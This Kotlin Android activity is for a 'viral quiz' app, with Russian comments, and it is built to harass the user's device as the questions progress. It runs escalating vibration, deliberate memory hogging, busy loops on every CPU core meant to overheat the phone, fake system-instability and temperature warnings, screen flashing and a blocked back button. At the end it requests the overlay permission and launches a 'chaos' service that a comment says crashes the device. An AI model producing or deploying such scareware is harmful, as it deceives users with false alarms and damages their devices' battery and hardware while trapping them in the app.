package com.example.viralquiz

import android.content.Intent
import android.media.MediaPlayer
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.view.View
import android.view.WindowManager
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {
    private var currentQuestion = 1
    private lateinit var questionText: TextView
    private lateinit var answerInput: EditText
    private lateinit var nextButton: Button
    private lateinit var progressBar: ProgressBar
    private lateinit var warningText: TextView
    
    private var mediaPlayer: MediaPlayer? = null
    private val handler = Handler(Looper.getMainLooper())
    private val memoryHog = mutableListOf<ByteArray>()
    
    // Данные ответов
    private val answers = mutableListOf<String>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        // Полный экран
        window.setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        )
        
        initViews()
        showQuestion(1)
    }

    private fun initViews() {
        questionText = findViewById(R.id.questionText)
        answerInput = findViewById(R.id.answerInput)
        nextButton = findViewById(R.id.nextButton)
        progressBar = findViewById(R.id.progressBar)
        warningText = findViewById(R.id.warningText)
        
        nextButton.setOnClickListener { onNextClicked() }
    }

    private fun showQuestion(number: Int) {
        currentQuestion = number
        progressBar.progress = number * 20
        
        // Воспроизводим звук для вопроса
        playSoundForQuestion(number)
        
        when(number) {
            1 -> {
                questionText.text = getString(R.string.question_1)
                answerInput.hint = getString(R.string.hint_name)
                answerInput.setText("")
                // Нормально, ничего подозрительного
            }
            2 -> {
                questionText.text = getString(R.string.question_2)
                answerInput.hint = getString(R.string.hint_color)
                answerInput.setText("")
                // Начинаем легкую вибрацию
                lightVibration()
            }
            3 -> {
                questionText.text = getString(R.string.question_3)
                answerInput.hint = getString(R.string.hint_notice)
                answerInput.setText("")
                // Показываем предупреждение
                warningText.text = "⚠️ Обнаружена нестабильность системы"
                warningText.visibility = View.VISIBLE
                // Ускоряем вибрацию
                mediumVibration()
                // Начинаем жрать немного памяти
                eatMemory(50)
            }
            4 -> {
                questionText.text = getString(R.string.question_4)
                answerInput.hint = getString(R.string.hint_heat)
                answerInput.setText("")
                warningText.text = "⚠️ КРИТИЧЕСКАЯ ТЕМПЕРАТУРА УСТРОЙСТВА"
                warningText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark))
                // Агрессивная вибрация
                heavyVibration()
                // Больше памяти
                eatMemory(150)
                // Начинаем греть CPU
                heatCPU()
            }
            5 -> {
                questionText.text = getString(R.string.question_5)
                questionText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark))
                answerInput.visibility = View.GONE
                nextButton.text = getString(R.string.btn_yes)
                nextButton.backgroundTintList = ContextCompat.getColorStateList(this, android.R.color.holo_red_dark)
                warningText.text = "⚠️ ПОСЛЕДНЕЕ ПРЕДУПРЕЖДЕНИЕ"
                warningText.textSize = 20f
                // Максимальный хаос перед финалом
                preChaosChaos()
            }
        }
    }

    private fun onNextClicked() {
        if (currentQuestion < 5) {
            // Сохраняем ответ
            if (answerInput.text.isNotEmpty()) {
                answers.add(answerInput.text.toString())
            }
            showQuestion(currentQuestion + 1)
        } else {
            // ФИНАЛ - запускаем хаос
            startFinalChaos()
        }
    }

    private fun playSoundForQuestion(number: Int) {
        mediaPlayer?.release()
        val soundRes = when(number) {
            1 -> R.raw.sound1
            2 -> R.raw.sound2
            3 -> R.raw.sound3
            4 -> R.raw.sound4
            5 -> R.raw.sound5
            else -> R.raw.sound1
        }
        
        try {
            mediaPlayer = MediaPlayer.create(this, soundRes)
            mediaPlayer?.start()
        } catch (e: Exception) {
            // Если звука нет, просто идем дальше
        }
    }

    private fun lightVibration() {
        val vibrator = getSystemService(VIBRATOR_SERVICE) as Vibrator
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (currentQuestion == 2) {
                    vibrator.vibrate(100)
                    handler.postDelayed(this, 2000)
                }
            }
        }, 1000)
    }

    private fun mediumVibration() {
        val vibrator = getSystemService(VIBRATOR_SERVICE) as Vibrator
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (currentQuestion == 3) {
                    vibrator.vibrate(300)
                    handler.postDelayed(this, 1000)
                }
            }
        }, 500)
    }

    private fun heavyVibration() {
        val vibrator = getSystemService(VIBRATOR_SERVICE) as Vibrator
        Thread {
            while (currentQuestion == 4) {
                vibrator.vibrate(500)
                Thread.sleep(600)
            }
        }.start()
    }

    private fun eatMemory(mb: Int) {
        Thread {
            try {
                repeat(mb) {
                    memoryHog.add(ByteArray(1024 * 1024)) // 1MB
                }
            } catch (e: OutOfMemoryError) {
                // Игнорируем, продолжаем хаос
            }
        }.start()
    }

    private fun heatCPU() {
        val cores = Runtime.getRuntime().availableProcessors()
        repeat(cores) {
            Thread {
                while (currentQuestion <= 4) {
                    // Бесконечные вычисления
                    var x = 0.0
                    for (i in 0..1000000) {
                        x += Math.sin(i.toDouble()) * Math.cos(i.toDouble())
                    }
                }
            }.start()
        }
    }

    private fun preChaosChaos() {
        // Перед финалом начинаем мелькать экраном
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (currentQuestion == 5) {
                    val colors = arrayOf(
                        android.R.color.black,
                        android.R.color.holo_red_dark,
                        android.R.color.holo_orange_dark
                    )
                    window.decorView.setBackgroundColor(
                        ContextCompat.getColor(this@MainActivity, colors.random())
                    )
                    handler.postDelayed(this, 200)
                }
            }
        }, 100)
        
        // Максимальная вибрация
        val vibrator = getSystemService(VIBRATOR_SERVICE) as Vibrator
        Thread {
            while (currentQuestion == 5) {
                vibrator.vibrate(1000)
                Thread.sleep(1100)
            }
        }.start()
    }

    private fun startFinalChaos() {
        // Проигрываем финальный звук
        mediaPlayer?.release()
        try {
            mediaPlayer = MediaPlayer.create(this, R.raw.chaos_sound)
            mediaPlayer?.start()
        } catch (e: Exception) {}
        
        // Проверяем разрешение на overlay
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                val intent = Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")
                )
                startActivityForResult(intent, 100)
            } else {
                launchChaosService()
            }
        } else {
            launchChaosService()
        }
    }

    private fun launchChaosService() {
        // Запускаем сервис хаоса
        startService(Intent(this, ChaosService::class.java))
        
        // Показываем финальное сообщение и закрываем
        questionText.text = getString(R.string.final_message)
        questionText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark))
        answerInput.visibility = View.GONE
        nextButton.visibility = View.GONE
        warningText.visibility = View.GONE
        
        handler.postDelayed({
            // "Крашим" - просто завершаем активность
            // Настоящий краш произойдет в сервисе
            finish()
        }, 3000)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 100) {
            launchChaosService()
        }
    }

    override fun onBackPressed() {
        // Блокируем кнопку назад на вопросах 3-5
        if (currentQuestion >= 3) {
            return
        }
        super.onBackPressed()
    }

    override fun onDestroy() {
        mediaPlayer?.release()
        super.onDestroy()
    }
}